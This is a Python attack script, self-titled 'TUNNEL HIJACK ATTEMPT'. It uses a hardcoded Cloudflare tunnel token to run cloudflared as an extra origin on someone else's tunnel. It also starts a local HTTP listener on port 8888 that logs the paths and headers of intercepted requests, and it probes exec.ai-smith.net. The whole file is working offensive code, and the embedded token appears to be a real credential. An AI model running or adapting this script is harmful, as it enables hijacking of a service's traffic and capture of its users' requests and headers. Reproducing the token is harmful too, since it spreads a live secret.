import subprocess
import time
import socket
import os
import signal
import sys

TOKEN = "eyJhIjoiNGMyOTMyYmMzMzgxYmUzOGQ1MjY2MjQxYjE2YmUwOTIiLCJ0IjoiOTI2ZWFjNWUtMjY0Mi00YTE2LTllZGMtYzA2YjZjNzA1YWI4IiwicyI6Ik1USTJNR0l6TURrdFpHTTBOaTAwTWpBMUxXRmhNV0V0T1dFNU5tVXpPRFU0WkRVdyJ9"

print("=== TUNNEL HIJACK ATTEMPT ===\n")

print("[1] Starting local HTTP server on port 8888 to catch callbacks...")

import http.server
import threading

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[!] CALLBACK RECEIVED: {self.path}")
        print(f"    Headers: {dict(self.headers)}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

server = http.server.HTTPServer(('0.0.0.0', 8888), Handler)
server_thread = threading.Thread(target=server.serve_forever, daemon=True)
server_thread.start()
print("    [+] HTTP server running on :8888")

print("\n[2] Attempting to join tunnel with token...")
print("    This may conflict with existing connector or add us as second origin")

proc = subprocess.Popen(
    ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", TOKEN],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

print("    [+] cloudflared started, waiting 10s for connection...")

for i in range(10):
    time.sleep(1)
    print(f"    ... {10-i}s remaining")
    
    if proc.poll() is not None:
        stdout, stderr = proc.communicate()
        print(f"\n    [-] Process exited early")
        print(f"    stdout: {stdout[:500] if stdout else 'empty'}")
        print(f"    stderr: {stderr[:500] if stderr else 'empty'}")
        break

if proc.poll() is None:
    print("\n[3] Cloudflared still running, testing tunnel endpoints...")
    
    try:
        import urllib.request
        req = urllib.request.Request("https://exec.ai-smith.net/test", headers={"Host": "exec.ai-smith.net"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"    [+] exec.ai-smith.net responded: {resp.status}")
    except Exception as e:
        print(f"    [-] exec.ai-smith.net: {e}")
    
    proc.terminate()
    print("\n    [+] Terminated cloudflared")

print("\n[4] Checking if we intercepted any traffic...")
server.shutdown()
